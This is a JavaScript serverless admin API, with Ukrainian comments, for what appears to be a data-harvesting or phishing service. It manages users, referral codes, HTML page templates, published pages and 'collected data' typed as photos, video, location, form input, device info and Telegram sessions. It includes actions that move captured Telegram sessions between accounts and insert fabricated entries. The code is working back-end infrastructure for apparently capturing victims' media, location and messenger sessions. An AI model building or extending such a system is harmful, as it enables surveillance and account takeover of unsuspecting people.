const { google } = require('googleapis');
const { nanoid } = require('nanoid');
const jwt = require('jsonwebtoken');
const stream = require('stream');

function getDriveClient() {
  if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY) {
    throw new Error("Missing Google service account credentials in environment variables.");
  }
  const credentials = {
    client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
    private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
  };
  const auth = new google.auth.GoogleAuth({
    credentials,
    scopes: ['https://www.googleapis.com/auth/drive'],
  });
  return google.drive({ version: 'v3', auth });
}

async function uploadMediaSimple(drive, buffer, filename, mimeType) {
  const fileMetadata = { name: filename };
  if (process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID) {
    try {
      await drive.files.get({ fileId: process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID });
      fileMetadata.parents = [process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID];
    } catch (_) {}
  }
  const media = { mimeType, body: Buffer.isBuffer(buffer) ? buffer : Buffer.from(buffer) };
  const file = await drive.files.create({ resource: fileMetadata, media, fields: 'id,name,webViewLink,webContentLink' });
  return file.data;
}

async function readDb(drive) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
    const res = await drive.files.get({ fileId, alt: 'media' });
    try {
        if (!res.data) return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [], addedData: [], news: [] };
        const dbData = typeof res.data === 'object' ? res.data : JSON.parse(res.data);
        if (!dbData.settings) dbData.settings = { defaultDeviceLimit: 3 };
        if (!dbData.templates) dbData.templates = [];
        if (!dbData.addedData) dbData.addedData = [];
        if (!dbData.news) dbData.news = [];
        return dbData;
    } catch (e) {
        console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
        return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [], addedData: [], news: [] };
    }
}

async function writeDb(drive, data) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
    const buffer = Buffer.from(JSON.stringify(data, null, 2));
    const bufferStream = new stream.PassThrough();
    bufferStream.end(buffer);
    await drive.files.update({
      fileId,
      media: {
        mimeType: 'application/json',
        body: bufferStream,
      },
    });
}

async function performDbOperation(operation) {
    const MAX_RETRIES = 3;
    let lastError = null;
    for (let i = 0; i < MAX_RETRIES; i++) {
        try {
            const drive = getDriveClient();
            const db = await readDb(drive);
            const { updatedDb, result } = await operation(db);
            await writeDb(drive, updatedDb);
            return result;
        } catch (error) {
            lastError = error;
            console.error(`DB Operation failed on attempt ${i + 1}:`, error.message);
            if (i < MAX_RETRIES - 1) {
                await new Promise(res => setTimeout(res, 200 * (i + 1)));
            }
        }
    }
    throw new Error(`Failed to complete DB operation after ${MAX_RETRIES} attempts. Last error: ${lastError.message}`);
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    try {
        const authHeader = event.headers.authorization || '';
        const token = authHeader.startsWith('Bearer ') ? authHeader.substring(7) : null;
        if (!token || !process.env.ADMIN_SECRET) return { statusCode: 401, body: 'Unauthorized' };
        
        const decodedToken = Buffer.from(token, 'base64').toString('utf8');
        if (decodedToken !== process.env.ADMIN_SECRET) return { statusCode: 401, body: 'Unauthorized' };
    } catch (e) { return { statusCode: 401, body: 'Unauthorized' }; }

    try {
        const { action, payload } = JSON.parse(event.body);
        
        const drive = getDriveClient();
        
        if (action === 'getDashboardData') {
            const db = await readDb(drive);
            const users = db.users.map(({ password, collectedData, sessions, ...user }) => ({
                ...user,
                sessionCount: sessions ? sessions.length : 0,
            }));
            return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length })};
        }

        if (action === 'getUserDetails') {
            const db = await readDb(drive);
            const user = db.users.find(u => u.userId === payload.userId);
            if (!user) return { statusCode: 404, body: 'User not found.' };
            const { password, collectedData, ...userDetails } = user;
            return { statusCode: 200, body: JSON.stringify({ ...userDetails, restrictions: user.restrictions || {} }) };
        }
        
        if (action === 'getCollectedDataForUser') {
            const db = await readDb(drive);
            const user = db.users.find(u => u.userId === payload.userId);
            if (!user) return { statusCode: 404, body: 'User not found.' };

            const allData = user.collectedData || [];
            const page = parseInt(payload.page, 10) || 1;
            const limit = 20;
            const startIndex = (page - 1) * limit;
            const endIndex = page * limit;

            const lightPaginatedData = allData
                .sort((a, b) => new Date(b.collectedAt) - new Date(a.collectedAt))
                .slice(startIndex, endIndex)
                .map(entry => {
                    const { data, ...metadata } = entry;
                    const itemCount = Array.isArray(data) ? data.length : null;
                    return { ...metadata, itemCount };
                });

            return { statusCode: 200, body: JSON.stringify({
                data: lightPaginatedData,
                total: allData.length,
                page,
                limit
            })};
        }
        
        if (action === 'getSingleCollectedDataEntry') {
            const db = await readDb(drive);
            const user = db.users.find(u => u.userId === payload.userId);
            if (!user) return { statusCode: 404, body: 'User not found' };
            const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
            return entry ? { statusCode: 200, body: JSON.stringify(entry) } : { statusCode: 404, body: 'Entry not found' };
        }

        if (action === 'getAddedDataById') {
            const db = await readDb(drive);
            const item = (db.addedData || []).find(a => a.id === payload.id);
            return item ? { statusCode: 200, body: JSON.stringify(item) } : { statusCode: 404, body: 'AddedData not found' };
        }

        const result = await performDbOperation(async (db) => {
            let operationResult;
            const user = db.users.find(u => u.userId === payload.userId);

            switch (action) {
                case 'getImpersonationToken': {
                    if (!process.env.JWT_SECRET) throw new Error('Missing JWT_SECRET');
                    if (!user) throw new Error('User not found.');
                    if (!user.sessions) user.sessions = [];
                    let session = user.sessions.find(s => s.status === 'active');
                    if (!session) {
                        session = { sessionId: nanoid(), ip: 'admin_impersonation', fingerprint: 'admin_impersonation', status: 'active', createdAt: new Date().toISOString(), lastUsedAt: new Date().toISOString() };
                        user.sessions.push(session);
                    } else {
                        session.lastUsedAt = new Date().toISOString();
                    }
                    const token = jwt.sign({ userId: user.userId, sessionId: session.sessionId }, process.env.JWT_SECRET, { expiresIn: '15m' });
                    operationResult = { statusCode: 200, body: JSON.stringify({ token }) };
                    break;
                }
                case 'deleteCollectedDataAdmin': {
                    if (user && user.collectedData) {
                        const timestampsToDelete = Array.isArray(payload.timestamps) ? payload.timestamps : [payload.timestamps];
                        user.collectedData = user.collectedData.filter(d => !timestampsToDelete.includes(d.collectedAt));
                    } else { throw new Error('User or data not found.'); }
                    operationResult = { statusCode: 200, body: 'Data deleted.' };
                    break;
                }
                // ... всі інші write-екшени ...
                case 'addTemplate': {
                    if (!db.templates) db.templates = [];
                    const newTemplate = { templateId: nanoid(16), name: payload.name, htmlContent: payload.htmlContent, createdAt: new Date().toISOString() };
                    db.templates.push(newTemplate);
                    operationResult = { statusCode: 201, body: JSON.stringify(newTemplate) };
                    break;
                }
                case 'deleteTemplate': {
                    if (db.templates) db.templates = db.templates.filter(t => t.templateId !== payload.templateId);
                    operationResult = { statusCode: 200, body: 'Template deleted.' };
                    break;
                }
                case 'generateCode': {
                    const uses = parseInt(payload.uses, 10) || 1;
                    const newCode = { code: nanoid(10), originalUses: uses, usesLeft: uses, createdAt: new Date().toISOString() };
                    db.refCodes.push(newCode);
                    operationResult = { statusCode: 201, body: JSON.stringify(newCode) };
                    break;
                }
                case 'deleteRefCode': {
                    db.refCodes = db.refCodes.filter(c => c.code !== payload.code);
                    operationResult = { statusCode: 200, body: 'Code deleted.' };
                    break;
                }
                case 'updateGlobalSettings': {
                    db.settings.defaultDeviceLimit = parseInt(payload.defaultDeviceLimit, 10) || 3;
                    operationResult = { statusCode: 200, body: 'Settings updated.' };
                    break;
                }
                case 'updateUser': {
                    if (user) {
                        user.status = payload.status === 'suspended' ? 'suspended' : 'active';
                        user.deviceLimitOverride = payload.deviceLimitOverride ? parseInt(payload.deviceLimitOverride, 10) : null;
                    }
                    operationResult = { statusCode: 200, body: 'User updated.' };
                    break;
                }
                case 'updateSession': {
                    const session = user ? user.sessions.find(s => s.sessionId === payload.sessionId) : null;
                    if (session) session.status = payload.status === 'blocked' ? 'blocked' : 'active';
                    operationResult = { statusCode: 200, body: 'Session updated.' };
                    break;
                }
                case 'deleteSession': {
                    if (user) user.sessions = user.sessions.filter(s => s.sessionId !== payload.sessionId);
                    operationResult = { statusCode: 200, body: 'Session deleted.' };
                    break;
                }
                case 'deleteUser': {
                    db.users = db.users.filter(u => u.userId !== payload.userId);
                    operationResult = { statusCode: 200, body: 'User deleted.' };
                    break;
                }
                case 'adminTransferSession': {
                    const { fromUserId, fromTimestamp, toUserId } = payload;
                    if (!fromUserId || !fromTimestamp || !toUserId) throw new Error('Missing required fields.');
                    const fromUser = db.users.find(u => u.userId === fromUserId);
                    const toUser = db.users.find(u => u.userId === toUserId);
                    if (!fromUser || !toUser) throw new Error('User not found.');
                    const idx = (fromUser.collectedData || []).findIndex(d => d.collectedAt === fromTimestamp && d.type === 'telegram_session');
                    if (idx === -1) throw new Error('Session entry not found.');
                    const entry = fromUser.collectedData[idx];
                    fromUser.collectedData.splice(idx, 1);
                    if (!toUser.collectedData) toUser.collectedData = [];
                    toUser.collectedData.push({ ...entry, transferredAt: new Date().toISOString(), transferredFrom: fromUser.userId });
                    operationResult = { statusCode: 200, body: JSON.stringify({ success: true }) };
                    break;
                }
                case 'adminAddDataToUsers': {
                    const { userIds, type, content } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    if (!type) throw new Error('type required');
                    if (!db.addedData) db.addedData = [];
                    const blockId = nanoid(16);
                    let preparedContent = content || null;
                    // Якщо переданий файл, завантажимо в Drive і збережемо посилання
                    if (content && content.file && content.file.data) {
                        const fileBuffer = Buffer.from(content.file.data, 'base64');
                        const filename = content.file.name || `file_${Date.now()}`;
                        const mimeType = content.file.type || 'application/octet-stream';
                        try {
                            const driveFile = await uploadMediaSimple(getDriveClient(), fileBuffer, filename, mimeType);
                            preparedContent = { file: { id: driveFile.id, name: driveFile.name, type: mimeType, url: driveFile.webViewLink } };
                        } catch (e) {
                            // fallback: зберігаємо inline, якщо не вдалося завантажити
                            preparedContent = { file: { name: filename, type: mimeType, data: content.file.data } };
                        }
                    }
                    const block = { id: blockId, type, content: preparedContent, createdAt: new Date().toISOString() };
                    db.addedData.push(block);
                    const now = new Date().toISOString();
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        if (!u.collectedData) u.collectedData = [];
                        const randomFingerprint = `fp_${nanoid(12)}`;
                        u.collectedData.push({ fingerprint: randomFingerprint, collectedAt: now, status: 'success', type, data: { addedDataId: blockId } });
                    }
                    operationResult = { statusCode: 201, body: JSON.stringify({ addedDataId: blockId }) };
                    break;
                }
                case 'deleteAddedDataBlock': {
                    const { id } = payload;
                    if (!id) throw new Error('id required');
                    // Remove references in all users
                    db.users.forEach(u => {
                        if (u.collectedData) {
                            u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId === id));
                        }
                    });
                    // Remove the block itself
                    db.addedData = (db.addedData || []).filter(a => a.id !== id);
                    operationResult = { statusCode: 200, body: 'Added data block deleted.' };
                    break;
                }
                case 'deleteAllAddedData': {
                    // Remove all references
                    db.users.forEach(u => { if (u.collectedData) u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId)); });
                    db.addedData = [];
                    operationResult = { statusCode: 200, body: 'All added data deleted.' };
                    break;
                }
                case 'updateUserRestrictions': {
                    const { userId, restrictions } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    u.restrictions = { ...(u.restrictions || {}), ...(restrictions || {}) };
                    operationResult = { statusCode: 200, body: 'Restrictions updated.' };
                    break;
                }
                case 'bulkUpdateUserRestrictions': {
                    const { userIds, restrictions } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    if (!restrictions || typeof restrictions !== 'object') throw new Error('restrictions object required');
                    let updated = 0;
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        u.restrictions = { ...(u.restrictions || {}), ...restrictions };
                        updated++;
                    }
                    operationResult = { statusCode: 200, body: JSON.stringify({ updated }) };
                    break;
                }
                case 'bulkClearUserRestrictions': {
                    const { userIds } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    let updated = 0;
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        u.restrictions = {};
                        updated++;
                    }
                    operationResult = { statusCode: 200, body: JSON.stringify({ updated }) };
                    break;
                }
                case 'publishUserPageAdmin': {
                    const { userId, source, sourceTemplateId, htmlContent } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    if (u?.restrictions?.publish_page) throw new Error('Publishing is restricted for this user.');
                    if (u?.restrictions?.customization && source === 'custom') throw new Error('Customization is restricted for this user.');
                    if (u?.restrictions?.ui_personalization && source === 'custom') throw new Error('UI personalization is restricted for this user.');
                    u.publishedPage = { source, sourceTemplateId: sourceTemplateId || null, htmlContent: htmlContent || null, updatedAt: new Date().toISOString() };
                    operationResult = { statusCode: 200, body: JSON.stringify(u.publishedPage) };
                    break;
                }
                case 'deleteUserPageAdmin': {
                    const { userId } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    u.publishedPage = null;
                    operationResult = { statusCode: 200, body: 'Page deleted.' };
                    break;
                }
                case 'createNews': {
                    if (!db.news) db.news = [];
                    const { title, text, imageUrl } = payload;
                    const item = { id: nanoid(16), title, text, imageUrl: imageUrl || null, createdAt: new Date().toISOString() };
                    db.news.push(item);
                    operationResult = { statusCode: 201, body: JSON.stringify(item) };
                    break;
                }
                case 'listNews': {
                    operationResult = { statusCode: 200, body: JSON.stringify((db.news || []).sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt))) };
                    break;
                }
                case 'deleteNews': {
                    const { id } = payload;
                    db.news = (db.news || []).filter(n => n.id !== id);
                    operationResult = { statusCode: 200, body: 'News deleted.' };
                    break;
                }
                case 'unbindTelegram': {
                    if (user && user.telegramBinding) {
                        user.telegramBinding = { ...user.telegramBinding, status: null, chatId: null, username: null, activationId: null };
                    }
                    operationResult = { statusCode: 200, body: 'Telegram unbound.' };
                    break;
                }
                case 'regenerateTelegramId': {
                    if (user) {
                        if (!user.telegramBinding) user.telegramBinding = {};
                        user.telegramBinding = { ...user.telegramBinding, status: 'pending', chatId: null, username: null, activationId: nanoid(16) };
                    }
                    operationResult = { statusCode: 200, body: 'Telegram ID regenerated.' };
                    break;
                }
                case 'toggleTelegramStatus': {
                    if (user && user.telegramBinding) {
                        if (user.telegramBinding.status === 'active') user.telegramBinding.status = 'suspended';
                        else if (['suspended', 'bot_blocked'].includes(user.telegramBinding.status)) user.telegramBinding.status = 'active';
                    }
                    operationResult = { statusCode: 200, body: 'Telegram status toggled.' };
                    break;
                }
                default:
                    throw new Error('Invalid admin action.');
            }
            return { updatedDb: db, result: operationResult };
        });
        return result;

    } catch (error) {
        console.error(`Admin API Error:`, error);
        const errorMessage = error.message || 'Unknown error';
        if (errorMessage.includes('not found')) return { statusCode: 404, body: errorMessage };
        if (errorMessage.includes('Invalid')) return { statusCode: 400, body: errorMessage };
        return { statusCode: 500, body: `Server error: ${errorMessage}` };
    }
};
